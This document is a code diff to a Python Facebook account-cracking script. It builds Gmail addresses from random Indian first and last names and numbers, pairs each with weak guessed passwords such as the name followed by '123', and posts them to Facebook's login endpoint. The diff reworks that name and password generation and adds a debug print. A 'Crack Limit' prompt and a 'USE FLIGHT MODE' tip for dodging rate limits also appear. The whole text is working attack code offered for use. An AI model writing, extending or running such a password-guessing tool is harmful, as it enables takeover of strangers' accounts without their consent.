@@ -935,6 +935,7 @@ def g_clone():
     print(logo)
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     first = random.choice(['sumon','rakesh','rahul','raj','joy','pritam','sayan','ramesh','sagar','debraj','avi','abinash','ujjal','rakesh','subho','rakesh','akash','abhijit','abir','aditya','amit','arjun','bapi','basu','bikash','bikram','deep','dev','dipankar','gautam','jaydeb','kamal','lakesh','polash','rajib','sourav','sujay','sujit','anik',])
+    last = random.choice(['roy','das','sarkar','mondal','biswas','ghosh','saha','haldar','pal','ray',])
     domain = '@gmail.com'
     try:
         limit = int(input(' [:] Crack Limit : '))
@@ -966,8 +967,9 @@ def g_clone():
         print(f'{green}=> USE FLIGHT MODE ')
         print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
-            uid = love+domain
-            pwx = [first+'12',first+'123',first+'1234',first+'12345']
+            nmn = first+last
+            uid = nmn+love+domain
+            pwx = [nmn,first+'12',first+'123',first+'1234',first+'12345']
             if SUMONfire =='1':SUMON_xd.submit(mail,uid,pwx,first,tl)
             else:
                 SUMON_xd.submit(mail,uid,pwx,first,tl)
@@ -2133,8 +2135,6 @@ def mail(uid,pwx,first,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            last = random.choice(['roy','das','sarkar','mondal','biswas','ghosh','saha','haldar','pal','ray',])
-            idff = first+last+uid
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -2177,6 +2177,7 @@ def mail(uid,pwx,first,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
             'viewport-width': '1034',}
+            print(data)
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = 'https://web.facebook.com/login/device-based/regular/login/'
             po = Session.post(url, cookies=cookies, headers=headers, data=data).text
